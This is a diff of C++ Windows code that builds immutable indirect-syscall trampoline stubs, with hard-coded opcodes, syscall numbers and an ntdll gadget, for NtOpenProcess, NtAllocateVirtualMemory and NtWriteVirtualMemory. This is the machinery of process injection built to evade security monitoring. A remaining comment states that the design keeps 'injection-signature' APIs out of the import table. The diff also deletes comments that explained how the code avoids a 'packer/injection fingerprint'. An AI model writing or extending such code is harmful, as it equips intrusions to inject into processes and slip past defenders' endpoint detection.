@@ -14,10 +14,6 @@ struct LgeTrampoline {
 
 static_assert(sizeof(LgeTrampoline) == 21, "stub layout changed");
 
-// One immutable stub per syscall, built once at init and never rewritten. This
-// avoids the per-invoke VirtualProtect RW<->RX flip that marks the region as
-// self-modifying code (a classic packer/injection fingerprint): the page is
-// written once while RW, then flipped to RX a single time and stays RX.
 enum LgeSyscallIndex {
     LGE_NT_OPEN_PROCESS = 0,
     LGE_NT_ALLOCATE_VIRTUAL_MEMORY,
@@ -36,7 +32,7 @@ namespace {
     // would otherwise import the injection-signature API set into the IAT.
     CRITICAL_SECTION g_LgeCs = {};
     LONG g_LgeCsInit = 0;
-    uint8_t* g_Stubs = nullptr;   // LGE_SYSCALL_COUNT consecutive LgeTrampoline
+    uint8_t* g_Stubs = nullptr;
     uint64_t g_Gadget = 0;
     bool     g_Ready = false;
 
@@ -91,10 +87,6 @@ static uint64_t LgeLocateGadget(HMODULE hNtdll) {
     return 0;
 }
 
-// Allocate the stub region read-write so the immutable stubs can be written,
-// then LgeFinalizeStubs flips it to read-execute exactly once. The region is
-// never writable and executable at the same time and never modified after init,
-// so it does not present the self-modifying-code pattern.
 static bool LgeBuildTrampoline() {
     if (g_Stubs) return true;
 
@@ -123,7 +115,6 @@ static LgeTrampoline* LgeStubAt(int index) {
     return (LgeTrampoline*)(g_Stubs + (size_t)index * sizeof(LgeTrampoline));
 }
 
-// Write one stub with its SSN and the shared gadget baked in.
 static void LgeFillStub(int index, DWORD ssn) {
     LgeTrampoline* t = LgeStubAt(index);
     t->mov_r10_rcx[0] = 0x4C; t->mov_r10_rcx[1] = 0x8B; t->mov_r10_rcx[2] = 0xD1;
@@ -150,7 +141,6 @@ static bool LgeProtectRegion(ULONG protect) {
     return fnProtect((HANDLE)-1, &base, &region, protect, &oldProtect) == 0;
 }
 
-// One-time transition to RX after all stubs are written.
 static bool LgeFinalizeStubs() {
     return LgeProtectRegion(PAGE_EXECUTE_READ);
 }
@@ -193,8 +183,6 @@ bool LgeInitialize() {
 
     if (!LgeBuildTrampoline()) return false;
 
-    // Bake every stub with its SSN and the shared gadget, then flip the region
-    // to RX once. No further modification happens at invoke time.
     LgeFillStub(LGE_NT_OPEN_PROCESS, g_SysNtOpenProcess);
     LgeFillStub(LGE_NT_ALLOCATE_VIRTUAL_MEMORY, g_SysNtAllocateVirtualMemory);
     LgeFillStub(LGE_NT_WRITE_VIRTUAL_MEMORY, g_SysNtWriteVirtualMemory);
